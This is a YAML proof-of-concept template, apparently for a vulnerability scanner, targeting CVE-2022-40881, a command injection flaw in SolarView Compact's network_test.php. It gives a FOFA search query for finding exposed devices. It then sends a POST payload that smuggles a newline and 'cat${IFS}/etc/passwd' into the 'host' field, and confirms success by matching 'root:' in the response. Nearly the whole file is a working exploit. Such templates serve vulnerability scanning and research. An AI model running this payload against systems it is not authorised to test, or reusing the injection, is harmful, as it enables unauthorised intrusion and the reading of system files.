id: poc-yaml-solarview-compact-network-test-php-rce
info:
  name: SolarView network_test.php 远程命令执行漏洞(CVE-2022-40881)
  severity: critical
  tags:
  - rce
  - CVE-2022-40881
  finger: SolarView Compact
  fofa: body="SolarView Compact" && title=="Top"
requests:
- method: GET
  path: /network_test.php
  expression: status_code == 200 && contains(body,"/cgi-bin/p1_network_ip.cgi")
- method: POST
  path: /network_test.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: host=%0acat${IFS}/etc/passwd%0a&command=ping
  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
    && contains(body,"<PRE>")
variables: {}
transport: http
